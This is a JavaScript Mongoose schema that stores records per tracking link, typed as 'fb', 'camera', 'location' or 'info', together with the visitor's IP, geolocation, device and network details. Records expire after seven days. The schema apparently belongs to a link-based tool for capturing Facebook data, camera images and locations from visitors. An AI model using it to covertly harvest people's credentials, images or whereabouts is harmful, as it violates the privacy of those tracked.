const mongoose = require('mongoose');

const DataSchema = new mongoose.Schema({
  linkId: {
    type: String,
    required: true
  },
  type: {
    type: String,
    enum: ['fb', 'camera', 'location', 'info'],
    required: true
  },
  data: {
    type: mongoose.Schema.Types.Mixed,
    required: true
  },
  ip: String,
  location: {
    country: String,
    region: String,
    city: String,
    latitude: Number,
    longitude: Number,
    postal: String,
    timezone: String
  },
  device: {
    browser: String,
    os: String,
    device: String,
    screen: String,
    language: String,
    platform: String
  },
  network: {
    isp: String,
    org: String,
    asn: String,
    mobile: Boolean,
    proxy: Boolean,
    hosting: Boolean
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

// 7 দিন পর অটো ডিলিট
DataSchema.index({ timestamp: 1 }, { expireAfterSeconds: 604800 });
DataSchema.index({ linkId: 1 });
DataSchema.index({ type: 1 });

module.exports = mongoose.model('Data', DataSchema);